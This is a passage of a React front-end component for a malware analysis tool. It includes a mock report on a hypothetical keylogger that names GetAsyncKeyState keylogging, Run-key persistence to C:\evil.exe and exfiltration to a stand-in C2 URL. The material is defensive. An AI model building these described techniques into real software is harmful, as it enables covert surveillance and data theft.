        "  - Obfuscation: 2 ocorrências = 4/10 pontos",
        "  - Network: 2 ocorrências = 10/10 pontos",
        "  - Persistência: 1 ocorrência = 8/10 pontos",
        "  - YARA: 2 ocorrências = 10/10 pontos",
        "",
        "RESUMO DAS CATEGORIAS",
        "- Suspicious Imports (4 ocorrências, 15/15 pontos)",
        "- Suspicious Functions (6 ocorrências, 18/18 pontos)",
        "- File I/O suspeito (3 ocorrências, 10/10 pontos)",
        "- Obfuscation (2 ocorrências, 4/10 pontos)",
        "- Network (2 ocorrências, 10/10 pontos)",
        "- Persistência (1 ocorrência, 8/10 pontos)",
        "- YARA (2 ocorrências, 10/10 pontos)",
        "",
        "ANÁLISE ESTÁTICA",
        "Imports Suspeitos:",
        "  - GetAsyncKeyState (user32)",
        "  - CreateFileA, WriteFile (kernel32)",
        "  - RegOpenKeyExA, RegSetValueExA (advapi32)",
        "  - InternetOpenA, InternetOpenUrlA (wininet)",
        "",
        "Indicadores C&C / Rede:",
        "  - URL de comando e controlo referenciada (get_c2_url)",
        "  - Uso de WinInet para comunicação HTTP",
        "",
        "DETALHE DAS CATEGORIAS",
        "## Suspicious Imports: 4 ocorrências = 15/15 pontos",
        "- Uso de GetAsyncKeyState nas linhas 42-43",
        "- Uso de CreateFileA na linha 58",
        "- Uso de WriteFile na linha 62",
        "- Uso de RegOpenKeyExA/RegSetValueExA nas linhas 51-52",
        "",
        "## Suspicious Functions: 6 ocorrências = 18/18 pontos",
        "- Função capture_keystrokes com padrão de keylogger",
        "- Função persist_registry altera Run para persistência",
        "- Função suspicious_function escreve em log.txt",
        "- Função exfil_data usa InternetOpenUrl para C2",
        "- get_c2_url constrói URL de forma ofuscada",
        "",
        "## File I/O suspeito: 3 ocorrências = 10/10 pontos",
        "- Escrita em log.txt na linha 58",
        "- Leitura de config.ini na linha 8",
        "- Caminho C:\\\\evil.exe em RegSetValueEx na linha 52",
        "",
        "## Obfuscation: 2 ocorrências = 4/10 pontos",
        "- String concatenation obfuscation em get_c2_url (linhas 27-30)",
        "- C# string concatenation: 4 ocorrências",
        "",
        "## Network: 2 ocorrências = 10/10 pontos",
        "- Chamada a InternetOpenA/InternetOpenUrlA em exfil_data",
        "- URL https://cnc.evil/upload no IL",
        "",
        "## Persistência: 1 ocorrência = 8/10 pontos",
        "- Escrita em HKCU\\\\...\\\\Run (persist_registry)",
        "",
        "YARA",
        "Regras que fizeram match:",
        "  - rule RAT_Keylogger { ... } (linhas 40-48)",
        "  - rule C2_HTTP_Beacon { ... } (linhas 65-70)",
        "",
        "CONCLUSÃO",
        "O ficheiro apresenta nível de risco CRÍTICO. Recomenda-se análise dinâmica em sandbox e quarentena.",
      ].join("\n"),
      riskScore: 92,
      riskLevel: "Crítico",
      flaggedIndicators: ["GetAsyncKeyState", "CreateFileA", "WriteFile", "RegOpenKeyExA", "RegSetValueExA", "InternetOpenA", "InternetOpenUrlA", "get_c2_url", "exfil_data"],
      obfuscationIndicatorCount: 2,
      flaggedFunctions: [
        { name: "read_config", id: "read_config:5-20", startLine: 5, endLine: 20, indicators: [], score: 6, severity: "BAIXO", reasons: ["I/O simples (leitura de config)"] },
        { name: "get_c2_url", id: "get_c2_url:24-32", startLine: 24, endLine: 32, indicators: ["String concatenation obfuscation"], score: 28, severity: "MÉDIO", reasons: ["Construção de URL de forma ofuscada (concatenação)"] },
        { name: "capture_keystrokes", id: "capture_keystrokes:36-45", startLine: 36, endLine: 45, indicators: ["GetAsyncKeyState"], score: 86, severity: "CRÍTICO", reasons: ["Keylogging via GetAsyncKeyState"] },
        { name: "persist_registry", id: "persist_registry:48-55", startLine: 48, endLine: 55, indicators: ["RegOpenKeyExA", "RegSetValueExA"], score: 74, severity: "ALTO", reasons: ["Persistência via registo (Run)"] },
        { name: "suspicious_function", id: "suspicious_function:57-65", startLine: 57, endLine: 65, indicators: ["CreateFileA", "WriteFile"], score: 46, severity: "ALTO", reasons: ["Escrita suspeita em ficheiro (log)"] },
        { name: "exfil_data", id: "exfil_data:67-73", startLine: 67, endLine: 73, indicators: ["InternetOpenA", "InternetOpenUrlA"], score: 58, severity: "ALTO", reasons: ["Comunicação externa via WinInet"] },
      ],
    };
    setFile(null);
    setAnalysisResult(demo);
    setShowResults(true);
    setError(null);
    setExpandedPanel(null);
    setScrollToLine(null);
    setWindowFocusLine(null);
    setSelectedWord(null);
  }, []);

  const handleAnalyze = useCallback(async () => {
    if (!file) return;
    setIsAnalyzing(true);
    setError(null);
    setAnalysisLogs([]);
    setGhidraProgress(null);

    try {
      // Modo antigo (apenas estática com streaming) continua a funcionar
      if (analysisMode === "static") {
        const formData = new FormData();
        formData.append("file", file);
        const res = await fetch(`${API_BASE}/api/analyze_stream`, {
          method: "POST",
          body: formData,
        });
        if (!res.ok || !res.body) {
          const text = await readErrorDetail(res, res.statusText);
          throw new Error(text || res.statusText);
        }

        const reader = res.body.getReader();
        const decoder = new TextDecoder("utf-8");
        let buffer = "";

        for (;;) {
          const { value, done } = await reader.read();
          if (done) break;
          buffer += decoder.decode(value, { stream: true });
          const lines = buffer.split("\n");
          buffer = lines.pop() ?? "";
          for (const raw of lines) {
            const line = raw.trim();
            if (!line) continue;
            let obj: unknown;
            try {
              obj = JSON.parse(line);
            } catch {
              continue;
            }
            if (
              obj &&
              typeof obj === "object" &&
              "type" in obj &&
              (obj as { type?: unknown }).type === "log" &&
              "message" in obj &&
              typeof (obj as { message?: unknown }).message === "string"
            ) {
              const msg = (obj as { message: string }).message;
              if (msg.startsWith(GHIDRA_PROGRESS_PREFIX)) {
                const rest = msg.slice(GHIDRA_PROGRESS_PREFIX.length).trim();
                const numeric = parseFloat(rest.replace("%", ""));
                if (!Number.isNaN(numeric)) {
                  setGhidraProgress(Math.max(0, Math.min(100, numeric)));
                }
              } else {
                setAnalysisLogs((prev) => [...prev, msg]);
              }
            } else if (
              obj &&
              typeof obj === "object" &&
              "type" in obj &&
              (obj as { type?: unknown }).type === "error" &&
              "message" in obj &&
              typeof (obj as { message?: unknown }).message === "string"
            ) {
              setError((obj as { message: string }).message);
            } else if (
              obj &&
              typeof obj === "object" &&
              "type" in obj &&
              (obj as { type?: unknown }).type === "result"
            ) {
              const r = asRecord(obj) ?? {};
              const data: AnalysisResult = {
                report: typeof r.report === "string" ? r.report : "",
                cCode: typeof r.cCode === "string" ? r.cCode : "",
                ilCode: typeof r.ilCode === "string" ? r.ilCode : "",
                fileName:
                  typeof r.fileName === "string"
                    ? r.fileName
                    : (file?.name ?? "output"),
                riskScore: typeof r.riskScore === "number" ? r.riskScore : 0,
                riskLevel: typeof r.riskLevel === "string" ? r.riskLevel : "",
                flaggedIndicators: Array.isArray(r.flaggedIndicators)
                  ? (r.flaggedIndicators as unknown[]).filter((x): x is string => typeof x === "string")
                  : [],
                flaggedFunctions: Array.isArray(r.flaggedFunctions)
                  ? (r.flaggedFunctions as unknown[])
                      .filter((x): x is Record<string, unknown> => !!x && typeof x === "object")
                      .map((f) => {
                        const rf = asRecord(f) ?? {};
                        return {
                          name: typeof rf.name === "string" ? rf.name : "",
                          id: typeof rf.id === "string" ? rf.id : undefined,
                          startLine: typeof rf.startLine === "number" ? rf.startLine : 0,
                          endLine: typeof rf.endLine === "number" ? rf.endLine : 0,
                          indicators: Array.isArray(rf.indicators)
                            ? (rf.indicators as unknown[]).filter((x): x is string => typeof x === "string")
                            : [],
                          score: typeof rf.score === "number" ? rf.score : undefined,
                          scoreRaw: typeof rf.scoreRaw === "number" ? rf.scoreRaw : undefined,
                          severity: typeof rf.severity === "string" ? rf.severity : undefined,
                          reasons: Array.isArray(rf.reasons)
                            ? (rf.reasons as unknown[]).filter((x): x is string => typeof x === "string")
                            : [],
                        };
                      })
                  : [],
              };
              setAnalysisResult(data);
              setShowResults(true);
            }
          }
        }
        return;
      }

      // Novos modos: dynamic ou both, usando a pipeline de jobs
      const formData = new FormData();
      formData.append("file", file);
      const res = await fetch(
        `${API_BASE}/api/analysis?analysis_type=${encodeURIComponent(analysisMode)}`,
        {
          method: "POST",
          body: formData,
        }
      );
      if (!res.ok) {
        const text = await readErrorDetail(res, res.statusText);
        throw new Error(text || res.statusText);
      }

      const submitData = (await res.json()) as {
        jobId: string;
        analysisType: string;
        status: string;
      };

      setAnalysisLogs((prev) => [...prev, `Job criado: ${submitData.jobId}`]);

      const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

      let attempts = 0;
      const maxAttempts = 300; // ~5 minutos com intervalo de 1s
      let finalJob: unknown = null;

      while (attempts < maxAttempts) {
        attempts += 1;
        const statusRes = await fetch(`${API_BASE}/api/analysis/${submitData.jobId}`);
        if (!statusRes.ok) {
          if (statusRes.status === 404) {
            throw new Error("Job de análise não encontrado.");
          }
          const text = await readErrorDetail(statusRes, statusRes.statusText);
          throw new Error(text || statusRes.statusText);
        }
        const job: unknown = await statusRes.json();
        finalJob = job;
        const jobRec = asRecord(job);
        const status = typeof jobRec?.status === "string" ? jobRec.status : "running";
        if (status === "queued" || status === "running") {
          if (attempts === 1 || attempts % 10 === 0) {
            setAnalysisLogs((prev) => [...prev, `Estado do job: ${status}`]);
          }
          await sleep(1000);
          continue;
        }
        break;
      }

      if (!finalJob) {
        throw new Error("Timeout ao aguardar conclusão da análise.");
      }

      if (
        finalJob &&
        typeof finalJob === "object" &&
        asRecord(finalJob)?.status === "failed"
      ) {
        const fj = asRecord(finalJob);
        const err = typeof fj?.error === "string" ? fj.error : null;
        throw new Error(err || "Análise falhou.");
      }

      const fj = asRecord(finalJob);
      const chosen = buildAnalysisResultFromJob(fj, file?.name ?? "output");

      if (!chosen) {
        throw new Error("Nenhum resultado disponível na análise.");
      }

      setResultJobId(submitData.jobId);
      // Depois de criar um job, coloca o jobId no URL (permalink) para back/forward funcionar bem.
      navigate(`/analysis/${encodeURIComponent(submitData.jobId)}`, { replace: false });
      setAnalysisResult(chosen);
      setShowResults(true);
    } catch (e) {
      setError(e instanceof Error ? e.message : "Erro ao analisar o ficheiro.");
    } finally {
      setIsAnalyzing(false);
    }
  }, [file, analysisMode, navigate]);

  const result = analysisResult;

  const reportFlags = useMemo(
    () => parseReportFlags(result?.report ?? ""),
    [result?.report]
  );

  const reportCategories = useMemo(
    () => parseReportCategories(result?.report ?? ""),
    [result?.report]
  );

  const reportChapters = useMemo(
    () => parseReportChapters(result?.report ?? ""),
    [result?.report]
  );

  const reportResumoLines = useMemo(() => {
    if (!result?.report) return null;
    const lines = result.report.split("\n");
    const collected: string[] = [];
    let inResumo = false;
    for (const raw of lines) {
      const line = raw.trim();
      if (!line) continue;
      if (/^RESUMO$/i.test(line)) {
        inResumo = true;
        continue;
      }
      if (inResumo) {
        if (/^[-=]{3,}$/.test(line) || /^[A-Z0-9ÁÀÂÃÉÈÊÍÓÔÕÚÇ].*:$/.test(line)) break;
        collected.push(line);
      }
    }
    return collected.length > 0 ? collected : null;
  }, [result?.report]);

  const reportAnalysisStatus = useMemo(() => {
    if (!result?.report) return null;
    const lines = result.report.split("\n");

    const getStatusForSection = (sectionKeyword: string): string | null => {
      const idx = lines.findIndex((l) =>
        l.toUpperCase().includes(sectionKeyword.toUpperCase())
      );
      if (idx === -1) return null;
      for (let i = idx + 1; i < Math.min(lines.length, idx + 10); i++) {
        const t = lines[i].trim();
        if (!t) continue;
        if (t.startsWith("Status:")) {
          return t.replace(/^Status:\s*/, "").trim();
        }
      }
      return null;
    };

    const yaraLine = lines.find((l) => l.toUpperCase().includes("TOTAL DE MATCHES"));
    const yaraMatches = yaraLine ? yaraLine.split(":").slice(1).join(":").trim() : null;

    return {
      staticScore: `${result.riskScore}/100${
        result.riskLevel ? ` (${result.riskLevel.toUpperCase()})` : ""
      }`,
      assemblyStatus: getStatusForSection("DESMONTAGEM"),
      ghidraStatus: getStatusForSection("DESCOMPILAÇÃO GHIDRA"),
      dotnetStatus: getStatusForSection("DESCOMPILAÇÃO .NET"),
      yaraMatches,
    };
  }, [result?.report, result?.riskScore, result?.riskLevel]);

  useEffect(() => {
    setOverviewCategoryIndex(0);
  }, [result?.report]);

  const flaggedFunctionsSorted = useMemo(() => {
    const src = (result?.flaggedFunctions ?? []).filter((f) => f && f.startLine > 0 && f.endLine > 0);
    const arr = [...src];
    if (flaggedFunctionsOrder === "severity") {
      // Score maior primeiro; em empate, mantém ordem no código (startLine).
      return arr.sort((a, b) => {
        const sa = typeof a.score === "number" ? a.score : Number.NEGATIVE_INFINITY;
        const sb = typeof b.score === "number" ? b.score : Number.NEGATIVE_INFINITY;
        return (sb - sa) || (a.startLine - b.startLine) || (a.endLine - b.endLine);
      });
    }
    return arr.sort((a, b) => a.startLine - b.startLine || a.endLine - b.endLine);
  }, [result?.flaggedFunctions, flaggedFunctionsOrder]);

  // Ao mudar a ordenação, mantém a função ativa (se existir) selecionada na nova lista.
  useEffect(() => {
    if (!activeCFunctionId || !flaggedFunctionsSorted.length) return;
    const idx = flaggedFunctionsSorted.findIndex((f) => {
      const fid = (f.id && f.id.trim()) || `${f.name}:${f.startLine}-${f.endLine}`;
      return fid === activeCFunctionId;
    });
    if (idx >= 0 && idx !== activeFlaggedFunctionIndex) {
      suppressAutoScrollRef.current = true; // não saltar no código só por reordenação
      setActiveFlaggedFunctionIndex(idx);
    }
  }, [activeCFunctionId, activeFlaggedFunctionIndex, flaggedFunctionsSorted]);

  const getFlaggedFunctionIndexForLine = useCallback(
    (line: number): number => {
      if (!flaggedFunctionsSorted.length) return -1;
      let bestIdx = -1;
      let bestLen = Number.POSITIVE_INFINITY;
      let bestStart = -1;
      for (let i = 0; i < flaggedFunctionsSorted.length; i++) {
        const f = flaggedFunctionsSorted[i];
        if (line < f.startLine || line > f.endLine) continue;
        const len = Math.max(0, f.endLine - f.startLine);
        // Escolhe a função mais "específica" (range menor). Em empate, escolhe a de start mais próximo (maior).
        if (len < bestLen || (len === bestLen && f.startLine > bestStart)) {
          bestIdx = i;
          bestLen = len;
          bestStart = f.startLine;
        }
      }
      return bestIdx;
    },
    [flaggedFunctionsSorted]
  );

  // Quando chega um novo resultado, começa na 1ª função flagged (se existir)
  useEffect(() => {
    if (flaggedFunctionsSorted.length === 0) {
      setActiveFlaggedFunctionIndex(0);
      setActiveCFunctionId(null);
      return;
    }
    setActiveFlaggedFunctionIndex(0);
    const f0 = flaggedFunctionsSorted[0];
    const fid0 = (f0.id && f0.id.trim()) || `${f0.name}:${f0.startLine}-${f0.endLine}`;
    setActiveCFunctionId(fid0);
  }, [flaggedFunctionsSorted]);

  const activeFlaggedFunction = flaggedFunctionsSorted.length
    ? flaggedFunctionsSorted[
        Math.min(
          Math.max(0, activeFlaggedFunctionIndex),
          Math.max(0, flaggedFunctionsSorted.length - 1)
        )
      ]
    : null;

  const activeCDisplayRange = useMemo(() => {
    if (!activeFlaggedFunction) return undefined;
    return [
      {
        start: Math.max(1, activeFlaggedFunction.startLine),
        end: Math.max(activeFlaggedFunction.startLine, activeFlaggedFunction.endLine),
      },
    ];
  }, [activeFlaggedFunction]);

  const selectFlaggedFunction = useCallback(
    (idx: number, opts?: { scroll?: boolean }) => {
      const scroll = opts?.scroll !== false;
      if (!flaggedFunctionsSorted.length) return;
      const clamped =
        ((idx % flaggedFunctionsSorted.length) + flaggedFunctionsSorted.length) %
        flaggedFunctionsSorted.length;
      const f = flaggedFunctionsSorted[clamped];

      // Se for atualização vinda do scroll, não queremos saltar para o topo da função.
      suppressAutoScrollRef.current = !scroll;

      setActiveFlaggedFunctionIndex(clamped);
      const fid = (f.id && f.id.trim()) || `${f.name}:${f.startLine}-${f.endLine}`;
      setActiveCFunctionId(fid);

      if (scroll && (expandedPanel === "c" || expandedPanel === null)) {
        setWindowFocusLine(null);
        setScrollToLine(f.startLine);
      }
    },
    [expandedPanel, flaggedFunctionsSorted]
  );

  // Quando a função ativa muda (por clique/setas), faz foco; quando muda por scroll, não mexe no scroll.
  useEffect(() => {
    if (!activeFlaggedFunction) return;
    if (suppressAutoScrollRef.current) {
      suppressAutoScrollRef.current = false;
      return;
    }
    if (expandedPanel !== "c" && expandedPanel !== null) return;
    setWindowFocusLine(null);
    setScrollToLine(activeFlaggedFunction.startLine);
  }, [activeFlaggedFunction, expandedPanel]);

  const cDisplayRanges = useMemo(
    () =>
      getCDisplayRanges(
        result?.cCode ?? "",
        result?.flaggedFunctions?.map((f) => ({
          startLine: f.startLine,
          endLine: f.endLine,
        }))
      ),
    [result?.cCode, result?.flaggedFunctions]
  );
  const cFunctionHighlights = useMemo(() => {
    const src = (result?.flaggedFunctions ?? []).filter((f) => f && f.startLine > 0 && f.endLine > 0);
    return src.map((f) => ({
      id: (f.id && f.id.trim()) || `${f.name}:${f.startLine}-${f.endLine}`,
      name: f.name,
      startLine: f.startLine,
      endLine: f.endLine,
      severity: f.severity,
      score: f.score,
      indicators: f.indicators,
      reasons: f.reasons,
    }));
  }, [result?.flaggedFunctions]);

  const baseDownloadName = useMemo(
    () => (result?.fileName ?? file?.name ?? "output").replace(/\.[^.]+$/, "") || "output",
    [result?.fileName, file?.name]
  );

  const handleFlagClick = useCallback(
    (flag: ReportFlag) => {
      if (expandedPanel === "report" && flag.reportLineIndex != null) {
        setScrollToLine(flag.reportLineIndex);
      } else if ((expandedPanel === "c" || expandedPanel === "il") && flag.line != null) {
        setScrollToLine(flag.line);
      }
    },
    [expandedPanel]
  );

  const highlightedLineRange = useMemo(() => {
    if (scrollToLine == null || scrollToLine < 1) return null;
    if (result?.cCode && (expandedPanel === "c" || expandedPanel === null)) {
      const block = getBlockContainingLine(result.cCode, scrollToLine);
      return block ?? { start: scrollToLine, end: scrollToLine };
    }
    if (expandedPanel === "il") return { start: scrollToLine, end: scrollToLine };
    return null;
  }, [expandedPanel, result?.cCode, scrollToLine]);

  useEffect(() => {
    if (scrollToLine == null) return;
    const t = setTimeout(() => setScrollToLine(null), 2200);
    return () => clearTimeout(t);
  }, [scrollToLine]);

  const handleCategoryClick = useCallback(
    (category: ReportCategory) => {
      // No relatório: teleporte para a linha do resumo
      if (expandedPanel === "report") {
        if (category.summaryLineIndex) {
          setScrollToLine(category.summaryLineIndex);
        }
        return;
      }

      if (expandedPanel === "c" || expandedPanel === "il") {
        const occurrences = category.lineNumbers;
        const currentIdx = categoryOffsets[category.id] ?? 0;

        const hasOccurrences = occurrences.length > 0;
        const targetLine = hasOccurrences
          ? occurrences[currentIdx % occurrences.length]
          : category.summaryLineIndex;

        if (!targetLine) return;

        setScrollToLine(targetLine);

        if (hasOccurrences) {
          const nextIdx = (currentIdx + 1) % occurrences.length;
          setCategoryOffsets((prev) => ({
            ...prev,
            [category.id]: nextIdx,
          }));
        }
      }
    },
    [expandedPanel, categoryOffsets]
  );

  const codeForPanel =
    expandedPanel === "c"
      ? result?.cCode ?? ""
      : expandedPanel === "il"
        ? result?.ilCode ?? ""
        : "";
  const wordStats = useMemo(
    () =>
      selectedWord && codeForPanel
        ? getWordStats(codeForPanel, selectedWord, expandedPanel === "c" ? cDisplayRanges ?? undefined : undefined)
        : null,
    [selectedWord, codeForPanel, expandedPanel, cDisplayRanges]
  );

  const handleWordSelect = useCallback((word: string) => {
    const w = word.trim();
    if (w.length >= 2) setSelectedWord(w);
  }, []);

  const openXrefExplorerFromSidebar = useCallback(() => {
    if (!selectedWord || !result?.cCode || expandedPanel !== "c") return;
    const jobId = resultJobId ?? lastExternalJobId;
    // Se temos jobId, usamos URL dedicado (não depende de sessionStorage e funciona em separador novo).
    if (jobId) {
      const href = `/analysis/${encodeURIComponent(jobId)}/xref?word=${encodeURIComponent(selectedWord)}`;
      openXrefExplorerTab(href, { forceNewTab: true });
      return;
    }

    // Fallback (resultados sem jobId): mantém o fluxo antigo via storage.
    try {
      writeXrefSession({
        v: 1,
        code: result.cCode,
        word: selectedWord,
        fileName: baseDownloadName,
        flaggedIndicators: result.flaggedIndicators,
      });
      openXrefExplorerTab("/xref", { forceNewTab: true });
    } catch {
      /* storage indisponível ou quota */
    }
  }, [
    selectedWord,
    result?.cCode,
    result?.flaggedIndicators,
    expandedPanel,
    baseDownloadName,
    resultJobId,
    lastExternalJobId,
  ]);

  // Timer/animação para a coluna de referências desaparecer ao fim de alguns segundos
  useEffect(() => {
    if (!selectedWord) {
      setReferencesRemainingMs(0);
      if (referencesTimerRef.current != null) {
        window.clearInterval(referencesTimerRef.current);
        referencesTimerRef.current = null;
      }
      return;
    }

    setReferencesRemainingMs(REFERENCES_TIMEOUT_MS);
    if (referencesTimerRef.current != null) {
      window.clearInterval(referencesTimerRef.current);
    }
    const id = window.setInterval(() => {
      setReferencesRemainingMs((prev) => {
        const next = prev - 200;
        if (next <= 0) {
          if (referencesTimerRef.current != null) {
            window.clearInterval(referencesTimerRef.current);
            referencesTimerRef.current = null;
          }
          setSelectedWord(null);
          return 0;
        }
        return next;
      });
    }, 200);
    referencesTimerRef.current = id;

    return () => {
      if (referencesTimerRef.current != null) {
        window.clearInterval(referencesTimerRef.current);
        referencesTimerRef.current = null;
      }
    };
  }, [selectedWord]);

  const showReferences =
    expandedPanel &&
    (expandedPanel === "c" || expandedPanel === "il") &&
    !!selectedWord &&
    referencesRemainingMs > 0;

  const referencesProgress =
    REFERENCES_TIMEOUT_MS > 0
      ? Math.max(0, Math.min(1, referencesRemainingMs / REFERENCES_TIMEOUT_MS))
      : 0;

  const handleLeftResizeStart = useCallback(
    (e: React.MouseEvent) => {
      e.preventDefault();
      resizeRef.current = { side: "left", startX: e.clientX, startLeft: leftColWidth, startRight: rightColWidth };
      const onMove = (e2: MouseEvent) => {
        if (!resizeRef.current || resizeRef.current.side !== "left") return;
        const delta = e2.clientX - resizeRef.current.startX;
        setLeftColWidth(
          Math.min(MAX_COL_WIDTH, Math.max(MIN_COL_WIDTH, resizeRef.current.startLeft + delta))
        );
      };
      const onUp = () => {
        document.removeEventListener("mousemove", onMove);
        document.removeEventListener("mouseup", onUp);
        resizeRef.current = null;
      };
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    },
    [leftColWidth, rightColWidth]
  );

  const handleRightResizeStart = useCallback(
    (e: React.MouseEvent) => {
      e.preventDefault();
      resizeRef.current = { side: "right", startX: e.clientX, startLeft: leftColWidth, startRight: rightColWidth };
      const onMove = (e2: MouseEvent) => {
        if (!resizeRef.current || resizeRef.current.side !== "right") return;
        const delta = e2.clientX - resizeRef.current.startX;
        setRightColWidth(
          Math.min(MAX_COL_WIDTH, Math.max(MIN_COL_WIDTH, resizeRef.current.startRight - delta))
        );
      };
      const onUp = () => {
        document.removeEventListener("mousemove", onMove);
        document.removeEventListener("mouseup", onUp);
        resizeRef.current = null;
      };
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    },
    [leftColWidth, rightColWidth]
  );

  return (
    <div className="min-h-screen bg-background grid-bg">
      {/* Header */}
      <header className="border-b border-border bg-card/80 backdrop-blur-sm">
        <div className="container flex items-center gap-3 py-4">
          <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 glow-primary">
            <Terminal className="h-5 w-5 text-primary" />
          </div>
          <div>
            <h1 className="font-mono text-lg font-bold text-foreground tracking-tight">
              CodeAnalyzer
            </h1>
            <p className="text-[11px] text-muted-foreground">
              .NET Binary & Source Analysis Tool
            </p>
          </div>
        </div>
      </header>

      <main className="container py-8">
        <AnimatePresence mode="wait">
          {!showResults ? (
            <motion.div
              key="upload"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0, y: -20 }}
              className="mx-auto max-w-xl space-y-6"
            >
              {/* Hero */}
              <div className="text-center space-y-2 pt-8 pb-4">
                <motion.h2
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="text-3xl font-bold tracking-tight text-foreground"
                >
                  Analise o seu código
                </motion.h2>
                <p className="text-sm text-muted-foreground">
                  Carregue um ficheiro .cs, .dll ou .exe para análise detalhada
                </p>
              </div>

              <FileDropZone
                onFileLoaded={handleFileLoaded}
                currentFile={file}
                onClear={handleClear}
              />

              {/* Seleção do tipo de análise */}
              <div className="mt-2 flex flex-wrap items-center justify-center gap-2 text-[11px] font-mono">
                <span className="text-muted-foreground">Tipo de análise:</span>
                <button
                  type="button"
                  onClick={() => setAnalysisMode("static")}
                  className={`rounded-full px-3 py-1 border text-xs transition-colors ${
                    analysisMode === "static"
                      ? "border-primary bg-primary/10 text-primary"
                      : "border-border bg-card text-muted-foreground hover:bg-secondary/60 hover:text-foreground"
                  }`}
                >
                  Apenas estática
                </button>
                <button
                  type="button"
                  onClick={() => setAnalysisMode("dynamic")}
                  className={`rounded-full px-3 py-1 border text-xs transition-colors ${
                    analysisMode === "dynamic"
                      ? "border-primary bg-primary/10 text-primary"
                      : "border-border bg-card text-muted-foreground hover:bg-secondary/60 hover:text-foreground"
                  }`}
                >
                  Apenas dinâmica
                </button>
                <button
                  type="button"
                  onClick={() => setAnalysisMode("both")}
                  className={`rounded-full px-3 py-1 border text-xs transition-colors ${
                    analysisMode === "both"
                      ? "border-primary bg-primary/10 text-primary"
                      : "border-border bg-card text-muted-foreground hover:bg-secondary/60 hover:text-foreground"
                  }`}
                >
                  Ambas
                </button>
              </div>

              {error && (
                <p className="text-sm text-destructive font-medium text-center">
                  {error}
                </p>
              )}

              {analysisLogs.length > 0 && (
                <div className="mt-2 rounded-lg border border-border bg-card/70 px-3 py-2 font-mono text-[11px] text-muted-foreground max-h-52 overflow-auto">
                  <div className="mb-1 text-[10px] uppercase tracking-wide text-muted-foreground/80">
                    Logs de análise (desmontagem / descompilação)
                  </div>
                  {analysisLogs.map((line, idx) => (
                    <div key={idx} className="whitespace-pre-wrap">
                      {line}
                    </div>
                  ))}
                </div>
              )}

              {ghidraProgress != null && (
                <div className="mt-2 rounded-lg border border-border bg-card/70 px-3 py-2">
                  <div className="mb-1 flex items-center justify-between text-[11px] font-mono text-muted-foreground">
                    <span>Progresso Ghidra (pseudo-C)</span>
                    <span>{ghidraProgress.toFixed(1)}%</span>
                  </div>
                  <div className="h-1.5 w-full rounded-full bg-muted overflow-hidden">
                    <div
                      className="h-full bg-primary transition-[width] duration-200"
                      style={{ width: `${ghidraProgress}%` }}
                    />
                  </div>
                </div>
              )}

              {/* Actions */}
              {file && (
                <motion.div
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="flex gap-3"
                >
                  {isCS && (
                    <button className="flex flex-1 items-center justify-center gap-2 rounded-lg border border-border bg-secondary px-4 py-3 font-mono text-sm font-medium text-secondary-foreground transition-colors hover:bg-secondary/80">
                      <Play className="h-4 w-4" />
                      Compilar
                    </button>
                  )}
                  <button
                    onClick={handleAnalyze}
                    disabled={isAnalyzing}
                    className="flex flex-1 items-center justify-center gap-2 rounded-lg bg-primary px-4 py-3 font-mono text-sm font-semibold text-primary-foreground transition-all hover:brightness-110 glow-primary disabled:opacity-50"
                  >
                    {isAnalyzing ? (
                      <>
                        <Cpu className="h-4 w-4 animate-spin" />
                        A analisar...
                      </>
                    ) : (
                      <>
                        <Cpu className="h-4 w-4" />
                        Executar Análise
                      </>
                    )}
                  </button>
                </motion.div>
              )}

              {/* Botão de demo/mock para ver rapidamente o layout das 3 colunas */}
              <div className="pt-4 text-center">
                <button
                  type="button"
                  onClick={loadMockDemo}
                  className="text-[11px] font-mono text-muted-foreground underline underline-offset-4 hover:text-foreground"
                >
                  Ver layout de teste (mock)
                </button>
              </div>
            </motion.div>
          ) : (
            <motion.div
              key="results"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="space-y-4"
            >
              {/* Results header */}
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <h2 className="font-mono text-lg font-bold text-foreground">
                    FORTNITE
                  </h2>
                  <span className="rounded-full bg-primary/10 px-3 py-1 font-mono text-xs text-primary">
                    {result?.fileName ?? file?.name}
                  </span>
                </div>
                <button
                  onClick={handleClear}
                  className="rounded-lg border border-border bg-secondary px-4 py-2 font-mono text-xs text-secondary-foreground transition-colors hover:bg-secondary/80"
                >
                  Nova Análise
                </button>
              </div>

              {/* Mostra erros também na vista de resultados, útil para debugging de job externo */}
              {error && (
                <p className="mt-2 text-sm text-destructive font-medium">
                  {error}
                </p>
              )}

              {/* Overview da análise + categorias navegáveis do relatório */}
              {result && reportCategories.length > 0 && (
                <div className="grid gap-3 md:grid-cols-4 items-stretch text-[11px] font-mono text-muted-foreground">
                  {/* Overview fixo à esquerda */}
                  <div className="md:col-span-2 rounded-lg border border-border bg-card/70 px-3 py-2">
                    <div className="text-[10px] uppercase tracking-wide text-muted-foreground/80 mb-1">
                      Overview da análise
                    </div>
                    <div className="flex flex-wrap items-center gap-2 text-foreground">
                      <span className="text-xs font-semibold">
                        Risco {result.riskScore}/100{" "}
                        {result.riskLevel && `(${result.riskLevel.toUpperCase()})`}
                      </span>
                      {result.flaggedIndicators && result.flaggedIndicators.length > 0 && (
                        <span className="rounded-full bg-primary/10 px-2 py-0.5 text-[10px] text-primary">
                          {result.flaggedIndicators.length} indicadores com flag no código
                        </span>
                      )}
                    </div>
                    <div className="mt-1 text-[11px] text-muted-foreground">
                      Use os marcadores do relatório e as funções suspeitas para navegar rapidamente entre as zonas mais críticas do pseudo-C e do IL.
                    </div>
                    {(result.obfuscatedSnippetsFile || result.obfuscatedSnippetsDeobfuscatedFile) && !(resultJobId || lastExternalJobId) && (
                      <div className="mt-1.5 rounded border border-primary/30 bg-primary/5 px-2 py-1 text-[10px] font-mono text-muted-foreground">
                        Trechos obfuscados extraídos: ver caminhos na secção DEOBFUSCAÇÃO do relatório.
                      </div>
                    )}
                    {(reportCategories.some((c) => /obfus/i.test(c.label)) || (result?.obfuscationIndicatorCount ?? 0) > 0) && (
